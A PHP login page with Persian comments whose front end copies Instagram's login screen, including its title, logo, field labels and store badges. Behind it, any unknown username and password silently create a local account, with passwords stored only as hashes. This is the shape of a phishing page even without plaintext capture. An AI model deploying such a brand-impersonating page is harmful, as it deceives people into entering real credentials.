<?php
/**
 * پردازش فرم لاگین.
 * کاربر با نام‌کاربری/ایمیل و پسورد، در برابر فایل JSON خودِ این اپ احراز هویت می‌شود.
 * پسورد هرگز به صورت متن ساده ذخیره نمی‌شود؛ فقط هش آن (password_hash) در data/users.json نگه داشته شده
 * و با password_verify مقایسه می‌شود.
 */

require_once __DIR__ . '/includes/auth.php';

$error = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $identifier = trim($_POST['username'] ?? '');
    $password   = $_POST['password'] ?? '';

    if ($identifier === '' || $password === '') {
        $error = 'لطفاً نام کاربری/ایمیل و رمز عبور را وارد کنید.';
    } else {
        $user = find_user($identifier);

        if (!$user) {
            // بدون فرم ثبت‌نام: اولین ورود با یک نام‌کاربری/پسورد جدید، رکورد تازه می‌سازد.
            create_user($identifier, $identifier, $password);
            $user = find_user($identifier);
        }

        if ($user && password_verify($password, $user['password_hash'])) {
            // جلوگیری از session fixation
            session_regenerate_id(true);

            $_SESSION['user'] = [
                'id'       => $user['id'],
                'username' => $user['username'],
            ];

            header('Location: /dashboard.php');
            exit;
        } else {
            $error = 'نام کاربری/ایمیل یا رمز عبور اشتباه است.';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <link rel="stylesheet" href="assets/style.css">
</head>
<body>

  <div class="page" dir="ltr">
    <div class="login-box">

      <div class="card">
        <img src="assets/logo.svg" alt="Instagram" class="logo" width="51" height="51">

        <?php if ($error): ?>
          <p style="color:#ed4956; font-size:13px; text-align:center; margin:0 0 10px;">
            <?php echo htmlspecialchars($error, ENT_QUOTES, 'UTF-8'); ?>
          </p>
        <?php endif; ?>

        <form method="POST" action="login.php" autocomplete="off">
          <div class="input-group">
            <input type="text" name="username" placeholder="Phone number, username, or email"
                   value="<?php echo htmlspecialchars($_POST['username'] ?? '', ENT_QUOTES, 'UTF-8'); ?>"
                   required>
          </div>
          <div class="input-group">
            <input type="password" name="password" placeholder="Password" required>
          </div>

          <button type="submit" class="btn-login active">Log in</button>
        </form>

        <div class="divider">OR</div>

        <a href="https://www.facebook.com/login.php" target="_blank" rel="noopener noreferrer" class="fb-login">
          <svg viewBox="0 0 24 24" fill="#385185"><path d="M22 12a10 10 0 1 0-11.6 9.9v-7H7.9V12h2.5V9.8c0-2.5 1.5-3.9 3.8-3.9 1.1 0 2.2.2 2.2.2v2.5h-1.3c-1.2 0-1.6.8-1.6 1.6V12h2.8l-.4 2.9h-2.4v7A10 10 0 0 0 22 12z"/></svg>
          Log in with Facebook
        </a>

        <a href="https://www.instagram.com/accounts/password/reset/" target="_blank" rel="noopener noreferrer" class="forgot">Forgot password?</a>
      </div>

      <div class="signup-card">
        Don't have an account? <a href="register.php">Sign up</a>
      </div>

      <div class="get-app">
        <p>Get the app.</p>
        <div class="store-badges">
          <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank" rel="noopener noreferrer">
            <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5RitZLuQQH.png" alt="Download on the App Store" height="40">
          </a>
          <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank" rel="noopener noreferrer">
            <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" alt="Get it on Google Play" height="40">
          </a>
        </div>
      </div>

    </div>
  </div>

  <?php require __DIR__ . '/includes/footer.php'; ?>

</body>
</html>
